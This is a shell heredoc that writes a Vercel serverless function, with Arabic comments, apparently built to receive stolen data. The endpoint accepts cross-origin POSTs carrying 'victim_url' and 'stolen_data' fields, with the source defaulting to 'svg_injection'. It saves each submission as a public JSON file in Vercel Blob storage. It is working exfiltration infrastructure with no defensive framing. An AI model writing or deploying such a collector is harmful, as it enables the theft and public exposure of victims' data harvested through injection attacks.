cat > api/api.js << 'EOF'
import { put } from '@vercel/blob';

let blobStoreInitialized = false;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const data = req.body;
        const id = Date.now().toString();
        const fileName = `submissions/${id}.json`;
        
        // استخدام access: 'public' مع Blob store عام
        const blob = await put(fileName, JSON.stringify({
            id: id,
            source: data.source || 'svg_injection',
            victim_url: data.victim_url,
            stolen_data: data.stolen_data || data,
            time: new Date().toISOString()
        }), {
            access: 'public',
            addRandomSuffix: false,
        });
        
        console.log('✅ تم حفظ البيانات نهائياً:', id);
        console.log('📊 الرابط:', blob.url);
        
        return res.status(200).json({ 
            success: true, 
            id: id, 
            url: blob.url,
            message: 'Data stored permanently in Vercel Blob'
        });
        
    } catch(error) {
        console.error('❌ خطأ:', error);
        return res.status(500).json({ success: false, error: error.message });
    }
}
EOF
